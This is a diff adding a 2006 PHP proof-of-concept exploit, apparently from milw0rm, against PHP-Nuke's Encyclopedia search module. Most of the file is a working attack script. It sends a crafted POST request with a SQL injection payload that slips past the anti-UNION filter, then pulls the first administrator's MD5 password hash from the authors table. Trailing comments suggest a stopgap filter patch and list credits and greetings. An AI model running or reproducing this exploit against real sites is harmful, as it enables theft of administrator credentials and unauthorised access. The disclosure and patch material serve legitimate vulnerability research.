@@ -1,0 +1,105 @@
+<?
+/*
+
+Neo Security Team - Exploit made by Paisterist on 2006-10-22
+http://www.neosecurityteam.net
+
+*/
+
+$host="localhost";
+$path="/phpnuke/";
+$prefix="nuke_";
+$port="80";
+$fp = fsockopen($host, $port, $errno, $errstr, 30);
+$data="query=fooaa&eid=foo'/**/UNION SELECT pwd as title FROM $prefix_authors WHERE '1'='1";
+
+if ($fp) {
+    $p="POST /phpnuke/modules.php?name=Encyclopedia&file=search HTTP/1.0\r\n";
+    $p.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*\r\n";
+    $p.="Referer: http://localhost/phpnuke/modules.php?name=Encyclopedia&file=search\r\n";
+    $p.="Accept-Language: es-ar\r\n";
+    $p.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $p.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
+    $p.="Host: localhost\r\n";
+    $p.="Content-Length: ".strlen($data)."\r\n";
+    $p.="Pragma: no-cache\r\n";
+    $p.="Connection: keep-alive\r\n\r\n";
+    $p.=$data;
+   
+    fwrite($fp, $p);
+   
+    while (!feof($fp)) {
+        $content .= fread($fp, 4096);
+    }
+
+    preg_match("/([a-zA-Z0-9]{32})/", $content, $matches);
+
+    print_r($matches);
+}
+
+// ==Real Proof of Concept exploit==
+
+// Whit this PoC code i get the md5 hash of the first admin (God) of the nuke_authors table.
+
+// - How to fix it? More information?
+// --------------------------------------------------------
+
+// You can found a patch on http://www.neosecurityteam.net/foro/
+
+// Also, you can modify the line 143 of mainfile.php, adding one more protection like:
+
+// ==[ mainfile.php old line (143) ]==========================
+// [...]
+// if (stripos_clone($postString,'%20union%20') OR stripos_clone($postString,'*/union/*') OR stripos_clone($postString,' union ') OR stripos_clone($postString_64,'%20union%20') OR stripos_clone($postString_64,'*/union/*') OR stripos_clone($postString_64,' union ') OR stripos_clone($postString_64,'+union+')) {
+// }
+// [...]
+// ==[ end mainfile.php ]=====================================
+
+// ==[ mainfile.php new line (143) ]==========================
+// [...]
+// if (stripos_clone($postString,'%20union%20') OR stripos_clone($postString,'*/union/*') OR stripos_clone($postString,' union ') OR stripos_clone($postString_64,'%20union%20') OR stripos_clone($postString_64,'*/union/*') OR stripos_clone($postString_64,' union ') OR stripos_clone($postString_64,'+union+') OR stripos_clone($postString_64,
+// '*/UNION ') OR stripos_clone($postString_64, ' UNION/*')) {
+// }
+// [...]
+// ==[ end mainfile.php ]=====================================
+
+// That's a momentary solution to the problem. I recommend to download the PHP Nuke 8.0 version in the next days... it is not
+// free at the moment.
+
+// - References
+// --------------------------------------------------------
+// http://www.neosecurityteam.net/index.php?action=advisories&id=27
+
+// - Credits
+// --------------------------------------------------------
+// Anti SQL Injection protection bypass by Paisterist -> paisterist.nst [at] gmail [dot] com
+// SQL Injection vulnerability in Encyclopedia module discovered by Paisterist -> paisterist.nst [at] gmail [dot] com
+// Proof of Concept exploit by Paisterist -> paisterist.nst [at] gmail [dot] com
+
+// [N]eo [S]ecurity [T]eam [NST] - http://www.neosecurityteam.net/
+
+
+// - Greets
+// --------------------------------------------------------
+// HaCkZaTaN
+// K4P0
+// Daemon21
+// Link
+// 0m3gA_x
+// LINUX
+// nitrous
+// m0rpheus
+// nikyt0x
+// KingMetal
+// Knightmare
+
+// Argentina, Colombia, Chile, Bolivia, Uruguay EXISTS!!
+
+// @@@@'''@@@@'@@@@@@@@@'@@@@@@@@@@@
+// '@@@@@''@@'@@@''''''''@@''@@@''@@
+// '@@'@@@@@@''@@@@@@ @@@'''''@@@
+// '@@'''@@@@'''''''''@@@''''@@@
+// @@@@''''@@'@@@@@@@@@@''''@@@@@
+?>
+
+# milw0rm.com [2006-10-22]
